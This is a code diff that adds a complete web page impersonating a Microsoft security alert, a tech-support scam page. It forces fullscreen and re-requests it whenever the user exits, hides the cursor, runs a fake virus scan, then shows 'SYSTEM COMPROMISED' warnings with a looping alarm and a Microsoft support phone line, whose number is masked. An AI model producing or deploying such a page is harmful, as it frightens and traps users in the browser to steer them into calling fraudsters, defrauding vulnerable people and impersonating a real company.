@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Security Breach Warning</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            enforceFullScreen();
+            hideCursor();
+            startScan();
+        });
+
+        function enforceFullScreen() {
+            let elem = document.documentElement;
+            function requestFullScreen() {
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen();
+                } else if (elem.mozRequestFullScreen) {
+                    elem.mozRequestFullScreen();
+                } else if (elem.webkitRequestFullscreen) {
+                    elem.webkitRequestFullscreen();
+                } else if (elem.msRequestFullscreen) {
+                    elem.msRequestFullscreen();
+                }
+            }
+            requestFullScreen();
+            document.addEventListener("fullscreenchange", requestFullScreen);
+            document.addEventListener("webkitfullscreenchange", requestFullScreen);
+            document.addEventListener("mozfullscreenchange", requestFullScreen);
+            document.addEventListener("msfullscreenchange", requestFullScreen);
+        }
+
+        function hideCursor() {
+            document.body.style.cursor = "none";
+        }
+
+        function startScan() {
+            let scanProgress = 0;
+            let interval = setInterval(() => {
+                scanProgress += 10;
+                $("#progressFill").css("width", scanProgress + "%");
+                $("#scan-status").text(scanProgress + "% Complete");
+                if (scanProgress >= 100) {
+                    clearInterval(interval);
+                    triggerAlerts();
+                }
+            }, 1500);
+        }
+
+        function triggerAlerts() {
+            $("#popup-header, #popup-footer, #criticalWarning").fadeIn();
+            $("#warning-audio")[0].play();
+        }
+    </script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', sans-serif;
+            background: url('windows11-security-bg.jpg') no-repeat center center/cover;
+            color: white;
+            text-align: center;
+            overflow: hidden;
+        }
+        .logo {
+            width: 150px;
+            margin-top: 20px;
+        }
+        .progress-container {
+            margin-top: 50px;
+        }
+        .progress-bar {
+            width: 80%;
+            background: gray;
+            height: 20px;
+            margin: auto;
+            border-radius: 5px;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: red;
+            border-radius: 5px;
+            transition: width 0.5s;
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            width: 100%;
+            background: red;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            font-weight: bold;
+            z-index: 9999;
+        }
+        #popup-header {
+            top: 0;
+        }
+        #popup-footer {
+            bottom: 0;
+        }
+        .critical-warning {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: darkred;
+            color: white;
+            padding: 30px;
+            border-radius: 10px;
+            width: 50%;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            box-shadow: 0px 0px 15px red;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
+    <h1>Microsoft Security Breach Warning</h1>
+    <p>Scanning your system for threats...</p>
+    <div class="progress-container">
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <p id="scan-status">0% Complete</p>
+    </div>
+    <div id="popup-header" class="popup">⚠ Security Breach Detected! Contact Support Immediately!</div>
+    <div id="popup-footer" class="popup">Call Microsoft Support: +1-800-XXX-XXXX</div>
+    <div id="criticalWarning" class="critical-warning">⚠ SYSTEM COMPROMISED! IMMEDIATE ACTION REQUIRED!</div>
+    <audio id="warning-audio" src="warning.mp3" loop></audio>
+</body>
+</html>
